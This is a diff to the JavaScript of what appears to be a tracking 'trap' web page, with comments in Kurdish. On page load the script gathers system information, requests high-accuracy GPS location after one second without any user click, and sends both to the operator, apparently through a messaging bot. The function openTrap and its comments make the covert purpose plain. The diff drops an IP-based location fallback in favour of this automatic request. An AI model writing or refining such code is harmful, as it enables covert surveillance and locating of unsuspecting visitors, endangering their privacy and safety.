@@ -40,67 +40,43 @@ async function gatherAndSendInfo() {
     await sendMessage(infoText);
 }
 
-// ڕێگای یەکەم: لوکیشنی وردی GPS
-function getHighAccuracyLocation() {
-    if (!navigator.geolocation) return;
-    navigator.geolocation.getCurrentPosition(
-        (pos) => {
-            if (locationSent) return;
-            const { latitude, longitude, accuracy } = pos.coords;
-            sendMessage(`📍 <b>High Accuracy Location (GPS)</b>\nAccuracy: ${accuracy}m\nMap: https://maps.google.com/?q=${latitude},${longitude}`);
-            locationSent = true;
-        },
-        (err) => {
-            // ئەگەر ڕێگای یەکەم شکست هێنا، ڕێگای دووەم تاقی بکەرەوە
-            getLowAccuracyLocation();
-        },
-        { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
-    );
-}
-
-// ڕێگای دووەم: لوکیشن بەپێی تۆڕی ئینتەرنێت (Wi-Fi/Data)
-function getLowAccuracyLocation() {
-    if (!navigator.geolocation) return;
-    navigator.geolocation.getCurrentPosition(
-        (pos) => {
-            if (locationSent) return;
-            const { latitude, longitude, accuracy } = pos.coords;
-            sendMessage(`📍 <b>Network-based Location (Fallback)</b>\nAccuracy: ${accuracy}m\nMap: https://maps.google.com/?q=${latitude},${longitude}`);
-            locationSent = true;
-        },
-        (err) => {
-            // ئەگەر ڕێگای دووەمیش شکست هێنا، ڕێگای سێیەم تاقی بکەرەوە
-            getLocationFromIP();
-        },
-        { enableHighAccuracy: false, timeout: 10000, maximumAge: 60000 }
-    );
-}
-
-// ڕێگای سێیەم: لوکیشن بەپێی IP (وەک دوا چارەسەر)
-async function getLocationFromIP() {
+// داواکردنی لوکیشن بە وردی بەرز بەبێ کلیک
+function requestLocationDirectly() {
     if (locationSent) return;
-    try {
-        const res = await fetch('https://ipapi.co/json/');
-        const data = await res.json();
-        if (data.latitude && data.longitude) {
-            sendMessage(`📍 <b>IP-based Location (Approximate)</b>\nCity: ${data.city}, ${data.country_name}\nMap: https://maps.google.com/?q=${data.latitude},${data.longitude}`);
-            locationSent = true;
-        } else {
-            sendMessage(`❌ <b>Location failed:</b> All 3 methods failed.`);
-        }
-    } catch (e) {
-        sendMessage(`❌ <b>Location failed:</b> IP API error.`);
+    
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+            (pos) => {
+                if (locationSent) return;
+                const { latitude, longitude, accuracy } = pos.coords;
+                sendMessage(`📍 <b>High Accuracy Location (GPS)</b>\nAccuracy: ${accuracy}m\nMap: https://maps.google.com/?q=${latitude},${longitude}`);
+                locationSent = true;
+            },
+            (err) => {
+                // ئەگەر مۆڵەت نەدرا یان هەڵەیەک هەبوو
+                sendMessage(`❌ <b>Location error:</b> ${err.message}`);
+            },
+            { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+        );
+    } else {
+        sendMessage(`❌ <b>Geolocation not supported.</b>`);
     }
 }
 
-// بانگکردنی سەرەکی کاتێک بەکارهێنەر کلیک دەکات
+// جێبەجێکردنی خۆکار لە کاتی کردنەوەی لاپەڕە
+window.addEventListener('load', () => {
+    // ١. ناردنی زانیاری سیستەم
+    gatherAndSendInfo();
+    
+    // ٢. داواکردنی لوکیشن ڕاستەوخۆ دوای ١ چرکە
+    setTimeout(() => {
+        requestLocationDirectly();
+    }, 1000);
+});
+
+// ئەمە بۆ ئەوەیە ئەگەر بەکارهێنەر کلیکیشی کرد، دووبارە داواکاری نەکات
 function openTrap() {
     if (!locationSent) {
-        // دەستپێکردنی ڕێگای یەکەم
-        getHighAccuracyLocation();
+        requestLocationDirectly();
     }
 }
-
-window.addEventListener('load', () => {
-    gatherAndSendInfo();
-});
